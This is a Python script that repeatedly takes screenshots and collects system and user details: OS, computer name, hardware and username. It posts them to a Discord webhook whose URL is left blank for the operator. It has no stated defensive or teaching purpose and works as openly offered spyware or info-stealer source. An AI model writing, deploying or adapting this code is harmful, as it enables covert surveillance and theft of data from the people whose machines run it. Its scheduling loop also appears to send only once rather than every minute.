import getpass
import platform
import time
import sched
from io import BytesIO

import cpuinfo
import psutil
import requests
import wmi
from PIL import Image
from PIL import ImageGrab

DISCORD_WEBHOOK_URL = ""
INTERVAL = 60  # seconds between each function call


def send_data():
    # Take a screenshot using the Pillow library
    screenshot = ImageGrab.grab()

    # Convert the screenshot to a PNG image in memory
    with BytesIO() as image_binary:
        screenshot.save(image_binary, 'PNG')
        image_binary.seek(0)
        image_data = image_binary.read()

    # Get the operating system name and version
    os_name = platform.system()
    os_version = platform.version()

    # Get the computer name
    computer_name = platform.node()

    # Get the processor information
    processor_info = cpuinfo.get_cpu_info()
    processor_name = processor_info['brand_raw']
    processor_type = processor_info['arch']

    ram_stats = psutil.virtual_memory()
    total_ram = ram_stats.total
    total_ram_gb = total_ram / (1024 ** 3)

    disk_usage = psutil.disk_usage('/')
    total_disk_space = disk_usage.total
    free_disk_space = disk_usage.free
    disk_space_info = f"Disk Space: {total_disk_space / (1024**3):.2f} GB total, {free_disk_space / (1024**3):.2f} GB free"

    wmi_service = wmi.WMI()
    video_controller = wmi_service.Win32_VideoController()[0]
    video_card_name = video_controller.Name

    # Get the current user
    current_user = getpass.getuser()

    # Send the screenshot and the computer data to Discord using the Webhooks API
    response = requests.post(
        DISCORD_WEBHOOK_URL,
        files={'image.png': image_data},
        data={'content': f"Operating System: {os_name} {os_version}\nComputer Name: {computer_name}\nProcessor: {processor_name} ({processor_type})\nRAM: {total_ram_gb:.2f} GB\nGraphics Card: {video_card_name}\n{disk_space_info}\nCurrent User: {current_user}\n"}
    )


def run_periodically(interval, function):
    # Schedule the first function call after the given interval
    scheduler = sched.scheduler(time.time, time.sleep)
    scheduler.enter(interval, 1, function)

    # Schedule the subsequent function calls according to the interval
    while True:
        scheduler.run()
        time.sleep(interval)


# Start the periodic function calls with an interval of 60 seconds (1 minute)
run_periodically(INTERVAL, send_data)
